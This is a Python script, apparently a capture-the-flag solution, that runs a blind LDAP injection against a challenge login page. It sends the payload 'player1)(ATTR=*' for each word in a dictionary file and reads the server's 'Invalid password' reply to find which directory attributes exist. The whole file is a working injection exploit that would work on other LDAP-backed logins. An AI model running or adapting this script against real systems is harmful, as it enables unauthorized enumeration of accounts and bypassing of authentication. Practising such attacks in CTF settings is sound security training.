#!/usr/bin/python3
import requests

fields = []
url = "http://btfryxiw.playat.flagyard.com/login"
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:143.0) Gecko/20100101 Firefox/143.0",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Origin": "http://btfryxiw.playat.flagyard.com",
    "Connection": "keep-alive",
    "Priority": "u=0"
}

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}

# Load potential attribute names from dic file
with open('dic', 'r') as f:
    words = f.read().splitlines()

for attr in words:
    # Injection payload to test if attribute exists (TRUE if "Invalid password")
    username = f"player1)({attr}=*"
    password = "blablabla"  # Arbitrary wrong password

    # Build multipart form data
    boundary = "----geckoformboundary533d8ac55e6a44d466cd9c4fed0292ff"
    data = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="username"\r\n\r\n'
        f"{username}\r\n"
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="password"\r\n\r\n'
        f"{password}\r\n"
        f"--{boundary}--\r\n"
    )

    headers["Content-Type"] = f"multipart/form-data; boundary={boundary}"
    headers["Content-Length"] = str(len(data))

    r = requests.post(url, headers=headers, data=data, proxies=proxies)

    if "Invalid password" in r.text:  # TRUE CONDITION for field existence
        fields.append(attr)
        print(f"[+] Found valid field: {attr}")

print("[+] All found fields: " + str(fields))